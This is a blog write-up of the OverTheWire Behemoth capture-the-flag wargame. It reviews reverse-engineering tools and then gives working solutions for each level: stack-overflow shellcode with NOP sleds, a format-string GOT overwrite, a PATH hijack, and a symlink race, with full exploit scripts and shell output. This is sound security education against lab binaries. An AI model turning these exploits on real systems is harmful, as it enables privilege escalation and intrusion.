---
layout: post
title:  "OverTheWire: Behemoth Writeup"
date:   2017-05-21 9:00:00 -0500
categories: exploits exercises
---
I continue my journeys through [OverTheWire] wargames with the next challenge:
[Behemoth]. This series has similar, simple memory corruption vulnerabilities to
exploit, but this time we aren't given source code. I also touch on some of the
tools I commonly use to approach reverse engineering and exploit development
for CTF-like challenges.

![otw-behemoth]({{ site.baseurl }}/img/otw-behemoth/otw-behemoth.png)

## Tools

I thought I'd start this blog post off with a quick overview of some of the
tools I find useful for solving these types of challenges. You'll likely see
these tools referenced in my solutions but I wanted to call them out
specifically, mention some potential alternatives, and explain my reasons for
choosing them for those of you that may be less familiar with all the options.

#### Built-In Linux Tools

Most linux distros come with a lot of built in tools that are pretty useful.
These tools aren't likely to solve any challenges for you on their own, but
they're useful for learning about the binary your looking at and debugging your
exploits when they don't work as expected.

- **strings** - this command line utility searches a given file for printable
  text and prints them to stdout. There aren't really any alternatives to a
  good `strings` search and it can be surprisingly useful. As such, it's one of
  the first things I run on a new binary/file/challenge.
- **strace** - prints dynamic system calls and their arguments while a program
  is running. Useful for getting a high level perspective on what a program is
  doing and for debugging hand written shellcode.
- **ltrace** - like `strace`, but for library (function) calls. This gives you
  an even higher level view of a programs execution and seeing what arguments
  are being passed to a particular function can be incredibly useful.

#### Disassembler

A disassembler (and in some cases a decompiler) is usually a reverse engineer's
most useful tool and where they'll spend most of their time examining a binary.
At a minimum, a disassembler will turn the binary machine code back into
readable assembly so you can start to make sense of what the program does.
Higher quality disassemblers provide a GUI, break the binary into basic blocks,
allow you to annotate and save your work, support directly editing a binary,
and potentially much more.

I personally use [BinaryNinja] - a relatively new reverse engineering platform
that provides a solid GUI, editing tools, a scripting api, and much more.  It's
a commercial product, at $100 for a personal license, but there is a [demo
version](https://binary.ninja/demo/) you can try. 

![binaryninja]({{ site.baseurl }}/img/otw-behemoth/binaryninja.png)
<p><center>BinaryNinja's CFG View</center></p>

If you're not interested in paying for a license, `objdump`, a command line
utility for inspecting and disassembling binaries, can be just as effective in
some cases - I used `objdump` and `gdb` for disassembly until relatively
recently. On the expensive end, another alternative to [BinaryNinja] is [IDA],
widely considered the industry standard. At $2350 a license, you get access to
their [Hex Rays] decompiler which will convert disassembled functions into
notional C code.

#### Debugger

Developing exploits for these challenges is a whole lot easier in an
environment you control, like a debugger.  On linux, nothing beats the good old
GNU debugger, or `gdb`. However, there are some extensions to `gdb` that make
exploit development much easier. I'm personally a fan of [pwndbg] - at every
breakpoint it prints register values, dereferencing if necessary (eg strings),
disassembly near the current instruction, a small window around the current
stack pointer, and the current backtrace. It also has a bunch of neat exploit
assistance features like heap inspection, ROP gadget search, memory space
search, and even [IDA] integration.


![pwndbg]({{ site.baseurl }}/img/otw-behemoth/pwndbg.png)

[PEDA], and [Voltron] are similar alternatives, but neither is as fully
featured or as mature as [pwndbg].

#### Other Tools

- [pwntools] - a library to assist exploit development in python. I would
  actually suggest newbies stay away from [pwntools] - it handles a lot of
  things for you that are worth struggling with if you haven't done them
  before.

## Solutions

_Warning: below are my solutions to the [Behemoth] wargame. If you're
interested in solving it yourself DO NOT READ THIS. Passwords have been
redacted with XXXXXXXXXX._

### Challenges

* [level0](#level0)
* [level1](#level1)
* [level2](#level2)
* [level3](#level3)
* [level4](#level4)
* [level5](#level5)
* [level6](#level6)
* [level7](#level7)
* [level8](#level8)
* [level9](#level9)

## Level0 {#level0}

SSH to `behemoth0@behemoth.labs.overthewire.org` with password `behemoth0` to
get started.

## Level0 &rarr; Level1 {#level1}

![level1_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level1_binaryninja.png)

Opening the first challenge up in [BinaryNinja], we can quickly get the idea
that this is a simple password challenge - there's a prompt for "Password:",
a call to `scanf` and a `strcmp` to a fixed value. If the strings are the same,
we get a shell, otherwise "Access denied..." A quick check of `man memfrob`
indicates that `memfrob` is used to encrypt a memory region - so our password
string is probably encrypted and modified at runtime. Rather than try and
decrypt it by hand, let's pop it open in [pwndbg] and break on the call to
`strcmp` to see what args are being passed.

![level1_pwndbg]({{ site.baseurl }}/img/otw-behemoth/level1_pwndbg.png)

If we take a look at the stack (this is where function arguments are stored per
the calling convention for x86), we can see the plaintext password as it is
passed to `strcmp`. Now we can grab the password for the next level.

{% highlight bash %}
behemoth0@melinda:/behemoth$ ./behemoth0 
Password: eatmyshorts
Access granted..
$ id
uid=13000(behemoth0) gid=13000(behemoth0) euid=13001(behemoth1) groups=13001(behemoth1),13000(behemoth0)
$ cat /etc/behemoth_pass/behemoth1
XXXXXXXXXX
{% endhighlight %}

## Level1 &rarr; Level2 {#level2}

![level2_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level2_binaryninja.png)

This level looks similar to the previous one on the surface, but this time
there's no password check. Instead, there's an unbounded write into a
fixed-size buffer that we can overflow. Let's figure out how many bytes we need
to get control of `eip`. After some trial and error:

{% highlight bash %}
behemoth1@melinda:/tmp/tremblingpants$ python -c 'print "A"*79+"BBBB"' | /behemoth/behemoth1 
Password: Authentication failure.
Sorry.
Segmentation fault
behemoth1@melinda:/tmp/tremblingpants$ dmesg
...
behemoth1[8772]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffd6e0 error 14
{% endhighlight %}

Great, now let's generate some shellcode and drop it in an environment variable
with a nice big `nop` sled in front of it (this is pretty similar to [a Narnia
challenge I solved
previously](http://ainterr.github.io/blog/exploits/exercises/2017/02/20/otw-narnia.html#level3)).

{% highlight bash %}
alex@orpheus ~/D/b/level2> python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> asm(shellcraft.i386.sh())
'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'
{% endhighlight %}

{% highlight python %}
# shellcode.py
buf = '\x90'*1000
buf += 'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'
print buf
{% endhighlight %}

{% highlight bash %}
behemoth1@melinda:/tmp/tremblingpants$ export EGG=`python shellcode.py`
{% endhighlight %}

Now we need to find where our shellcode is in memory, so we'll open it up in
`gdb` and look for our `EGG` environment variable.

{% highlight bash %}
(gdb) b main
Breakpoint 1 at 0x8048460
(gdb) r
Starting program: /games/behemoth/behemoth1 

Breakpoint 1, 0x08048460 in main ()

(gdb) x/500s $sp
...
0xffffd479:     "/games/behemoth/behemoth1"
0xffffd493:     "XDG_SESSION_ID=17064"
0xffffd4a8:     "SHELL=/bin/bash"
0xffffd4b8:     "TERM=screen"
0xffffd4c4:     "SSH_CLIENT=73.38.12.28 52202 22"
0xffffd4e4:     "SSH_TTY=/dev/pts/11"
0xffffd4f8:     "LC_ALL=C"
0xffffd501:     "EGG=", '\220' <repeats 196 times>...
0xffffd5c9:     '\220' <repeats 200 times>...
0xffffd691:     '\220' <repeats 200 times>...
0xffffd759:     '\220' <repeats 200 times>...
0xffffd821:     '\220' <repeats 200 times>...
0xffffd8e9:     "\220\220\220\220h\001\001\001\001\201\064$ri\001\001\061\322Rj\004Z\001\342R\211\342jhh///sh/binj\vX\211\343\211\321\231\315\200"
0xffffd91b:     "USER=behemoth1"
...
{% endhighlight %}

There it is, so picking an address right in the middle of our `nop` sled, we
can write an exploit script.

{% highlight python %}
# exploit.py
import struct

address = 0xffffd691

buf = 'A'*79
buf += struct.pack('<I', address)
print buf
{% endhighlight %}

We have to remember to keep `stdin` open since the binary will quit as soon as
it is closed and kill our shell. Adding a simple `cat` with no arguments will
do the trick.

{% highlight bash %}
behemoth1@melinda:/tmp/tremblingpants$ (python exploit.py; cat) | /behemoth/behemoth1 
Password: Authentication failure.
Sorry.
id
uid=13001(behemoth1) gid=13001(behemoth1) euid=13002(behemoth2) groups=13002(behemoth2),13001(behemoth1)
cat /etc/behemoth_pass/behemoth2
XXXXXXXXXX
{% endhighlight %}

## Level2 &rarr; Level3 {#level3}

![level3_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level3_binaryninja.png)

This program gets the current process id with `getpid` and then calls `touch`
on that pid, via `system`. However, the path to the binary is not specified
absolutely, so we can manipulate the PATH environment variable to make `touch`
do whatever we want. Unfortunately, we can't just write a bash script for this
because bash drops effective privileges; we'll have to write it in C.

{% highlight c %}
// touch.c
#include <stdlib.h>

void main() {
    system("cat /etc/behemoth_pass/behemoth3");
}
{% endhighlight %}

{% highlight bash %}
behemoth2@melinda:/tmp/coldrain$ gcc touch.c -o touch
behemoth2@melinda:/tmp/coldrain$ PATH=./:$PATH /behemoth/behemoth2 
XXXXXXXXXX
{% endhighlight %}

## Level3 &rarr; Level4 {#level4}

![level4_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level4_binaryninja.png)

Similar to the last 'password' one, we're asked for some input value, but no
check is performed and the program simply exits after printing our input
string.  Fortunately for us, the program passes our input directly to `printf`,
so it's likely a formatstring vulnerability.

{% highlight bash %}
behemoth3@melinda:/tmp/flatflute$ /behemoth/behemoth3 
Identify yourself: %x.%x.%x.%x
Welcome, c8.f7fcac20.f7ff2e76.2

aaaand goodbye again.
{% endhighlight %}

Looks like by entering special formatting characters, we can print values off
the stack (for more on format string vulnerabilities check out [OWASPs wiki
page](https://www.owasp.org/index.php/Format_string_attack)). This gives us the
ability to write to an arbitrary location, but what should we write? If we look
back at the disassembly, we can see that the program calls `puts` after the
vulnerable `printf` - this is perfect candidate for us to overwrite in the
global offset table (GOT) with the address of some shellcode. Let's start by
overwriting the GOT entry with a dummy value.

{% highlight bash %}
behemoth3@melinda:/tmp/flatflute$ python -c 'print "AAAA"+"%x."*6' | ./behemoth3 
Identify yourself: Welcome, AAAAc8.f7fcac20.0.0.f7ffd000.41414141.

aaaand goodbye again.
{% endhighlight %}

After some trial and error, we know that we can find the beginning of our
format string after 6 reads. Let's check [BinaryNinja] again for the address of
`puts` in the GOT.

![level4_got]({{ site.baseurl }}/img/otw-behemoth/level4_got.png)

Great, so now we can start to write our exploit script. I used the same process
as the last challenge to generate a shellcode environment variable `EGG` and
find its address, so I won't repeat it here. The general outline of the exploit
is as follows.

{% highlight python %}
# exploit.py
import struct

puts_got = 0x8049790

buf = struct.pack('<I', puts_got)
buf += 'AAAA'
buf += struct.pack('<I', puts_got+0x2)
buf += '%x.'*4
buf += '%x'
buf += '%hn'
buf += '%x'
buf += '%hn'

print buf
{% endhighlight %}

We're using short writes here (that's the `%hn`), so we need to write each half
of the address in the GOT in a sepirate write. We start with the address of the
first write, followed by a word of junk, and then the address of the second
write. Using the offset we found earlier and two `%hn`s we can start trying
some values for the sizes of reads in each `%x` preceding the `%hn` and check
in a debugger if we've written the address of our shellcode `EGG` (`0xffffd696`
in my case) to the GOT, adjusting accordingly. After some trial and error, I
came up with the following.

{% highlight python %}
# exploit.py
import struct

puts_got = 0x8049790

buf = struct.pack('<I', puts_got)
buf += 'AAAA'
buf += struct.pack('<I', puts_got+0x2)
buf += '%x.'*4
buf += '%54906x'
buf += '%hn'
buf += '%10594x'
buf += '%hn'

print buf
{% endhighlight %}

{% highlight bash %}
id
uid=13003(behemoth3) gid=13003(behemoth3) euid=13004(behemoth4) groups=13004(behemoth4),13003(behemoth3)
cat /etc/behemoth_pass/behemoth4
XXXXXXXXXX
{% endhighlight %}

## Level4 &rarr; Level5 {#level5}

![level5_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level5_binaryninja1.png)

This program gets the current process id, then checks for the existence of a
file named `/tmp/{pid}`. 

![level5_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level5_binaryninja2.png)

If it exists, it reads it out a single character at a time and prints it to
stdout. My first thought was to create a symbolic link to
`/etc/behemoth_pass/behemoth5` at `/tmp/{pid}` for it to read, but I'd have to
know the pid of the `behemoth4` process before it tried to open the file. It
would probably be possible to predict which pid would be allocated to the newly
spawned `behemoth4` process, but I opted for a more precise solution - suspend
the process on spawn, giving me plenty of time to create the symbolic link,
then resume it. Here's a simple bash script to start a processes suspended.

{% highlight bash %}
#!/bin/bash
# startstopped.sh

echo $$
kill -STOP $$
exec "$@"
{% endhighlight %}

This script prints the current pid (`$$` in bash), sends a `SIGSTOP` to itself,
and then `exec`s the program provided as an argument when resumed.

{% highlight bash %}
behemoth4@melinda:/tmp/frozenbar$ ./startstopped.sh /behemoth/behemoth4 
12996

[1]+  Stopped                 ./startstopped.sh /behemoth/behemoth4
behemoth4@melinda:/tmp/frozenbar$ ln -s /etc/behemoth_pass/behemoth5 /tmp/12996
behemoth4@melinda:/tmp/frozenbar$ fg
./startstopped.sh /behemoth/behemoth4
Finished sleeping, fgetcing
XXXXXXXXXX
{% endhighlight %}

## Level5 &rarr; Level6 {#level6}

![level6_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level6_binaryninja_top.png)

![level6_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level6_binaryninja_bottom.png)

At first glance, this program looks like it's going to be a bit more difficult
to reverse engineer. However, just looking at the flow of api calls:
`fopen("/etc/behemoth_pass/behemoth6")`, `fgets(...)`,
`gethostbyname("localhost")`, `socket(...)`, `atoi("1337")`, `sendto(...)` we
can guess that this probably just stupidly sends the password for the next
level to `localhost:1337`. 

{% highlight bash %}
behemoth5@melinda:/tmp/sharpcoffee$ nc -l -u 1337 &
[1] 19684
behemoth5@melinda:/tmp/sharpcoffee$ /behemoth/behemoth5 
XXXXXXXXXX
behemoth5@melinda:/tmp/sharpcoffee$ fg
nc -l -u 1337
^C
{% endhighlight %}

## Level6 &rarr; Level7 {#level7}

![level7_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level7_binaryninja1.png)

This program calls another program `/behemoth/behemoth6_reader`, reading the
output string and comparing that string to a fixed value: `HelloKitty`. If the
value is correct, it starts a shell. Opening up `behemoth6_reader` in
BinaryNinja, we can see reads the contents of a file into memory:

![level7_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level7_binaryninja2.png)

And then simply executes it as code.

![level7_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level7_binaryninja3.png)

I chose to use pwntools to generate shellcode that prints the string
`HelloKitty` and then exits.

{% highlight python %}
alex@orpheus ~/D/b/level7> python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> shellcode = asm(shellcraft.i386.echo('HelloKitty')+shellcraft.i386.exit(0)) 
>>> f = open('shellcode.txt', 'wb')
>>> f.write(shellcode)
>>> f.close()
{% endhighlight %}

{% highlight bash %}
behemoth6@melinda:/tmp/ninjabody$ /behemoth/behemoth6
Correct.
$ id
uid=13006(behemoth6) gid=13006(behemoth6) euid=13007(behemoth7) groups=13007(behemoth7),13006(behemoth6)
$ cat /etc/behemoth_pass/behemoth7
XXXXXXXXXX
{% endhighlight %}

## Level7 &rarr; Level8 {#level8}

![level8_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level8_binaryninja1.png)

Initially opening this program in [BinaryNinja], it looks like it zeroes
environment variables at the beginning of main. This means we won't be able to
store our shellcode in an environment variable as we did previously.

![level8_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level8_binaryninja2.png)

Main then checks the contents of the provided argument and, if it contains any
non-printable characters, it quits. So we won't be able to store our naive
shellcode in the buffer itself.

![level8_binaryninja]({{ site.baseurl }}/img/otw-behemoth/level8_binaryninja3.png)

Finally, there's a vulnerable `strcpy` if we pass the previous check.

Luckily, there's a bug in the printable check - it only checks the first 511
(0x1ff) bytes of the provided buffer, so we can put our shellcode anywhere in
the buffer after the first 511 bytes, in the space that we overflow. After some
experimentation, we get control of `eip` after 536 bytes.

{% highlight bash %}
behemoth7@melinda:/tmp/purplecandle$ /behemoth/behemoth7 `python -c 'print "A"*536+"BBBB"'`
Segmentation fault
behemoth7@melinda:/tmp/purplecandle$ dmesg
...
behemoth7[931]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffd090 error 14
{% endhighlight %}

Now that we have control, we can begin to write our exploit script.

{% highlight python %}
# exploit.py
import struct

address = 0xdeadbeef
shellcode = 'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'

buf += 'A'*536
buf += struct.pack('<I', address)
buf += '\x90'*1000
buf += shellcode

print buf
{% endhighlight %}

We can use `gdb` to find the address of our buffer on the stack by breaking on
the `strcpy`.

{% highlight bash %}
(gdb) b *0x804868d
Breakpoint 1 at 0x804868d
(gdb) r `python exploit.py`
Starting program: /games/behemoth/behemoth7 `python exploit.py`

Breakpoint 1, 0x0804868d in main ()
(gdb) x/500s $sp
...
0xffffce43:     ""
0xffffce44:     ""
0xffffce45:     "/games/behemoth/behemoth7"
0xffffce5f:     'A' <repeats 200 times>...
0xffffcf27:     'A' <repeats 200 times>...
0xffffcfef:     'A' <repeats 136 times>, "\177\321\377\377", '\220' <repeats 60 times>...
0xffffd0b7:     '\220' <repeats 200 times>...
0xffffd17f:     '\220' <repeats 200 times>...
0xffffd247:     '\220' <repeats 200 times>...
0xffffd30f:     '\220' <repeats 200 times>...
0xffffd3d7:     '\220' <repeats 140 times>, "h\001\001\001\001\201\064$ri\001\001\061\322Rj\004Z\001\342R\211\342jhh///sh/binj\vX\211\343\211\321\231\315\200"
0xffffd491:     ""
0xffffd492:     ""
0xffffd493:     ""
...
{% endhighlight %}

We can see that the program did in fact zero out the environment variables,
which would have appeared right above the program image name on the stack. We
can also see our `nop` sled and shellcode at the bottom of the argument buffer;
let's pick an address somewhere in the middle and write our final exploit
script.

{% highlight python %}
# exploit.py
import struct

address = 0xffffd17f
shellcode = 'h\x01\x01\x01\x01\x814$ri\x01\x011\xd2Rj\x04Z\x01\xe2R\x89\xe2jhh///sh/binj\x0bX\x89\xe3\x89\xd1\x99\xcd\x80'

buf += 'A'*536
buf += struct.pack('<I', address)
buf += '\x90'*1000
buf += shellcode

print buf
{% endhighlight %}

{% highlight bash %}
behemoth7@melinda:/tmp/purplecandle$ /behemoth/behemoth7 `python exploit.py`
$ id
uid=13007(behemoth7) gid=13007(behemoth7) euid=13008(behemoth8) groups=13008(behemoth8),13007(behemoth7)
$ cat /etc/behemoth_pass/behemoth8
XXXXXXXXXX
{% endhighlight %}

And that's the final challenge for [Behemoth].

[Narnia]: http://overthewire.org/wargames/narnia/
[Behemoth]: http://overthewire.org/wargames/behemoth/
[OverTheWire]: http://overthewire.org
[BinaryNinja]: http://binary.ninja
[IDA]: https://www.hex-rays.com/products/ida/index.shtml
[Hex Rays]: https://www.hex-rays.com/products/decompiler/index.shtml
[pwndbg]: https://github.com/pwndbg/pwndbg
[PEDA]: https://github.com/longld/peda
[Voltron]: https://github.com/snare/voltron
[pwntools]: https://github.com/Gallopsled/pwntools
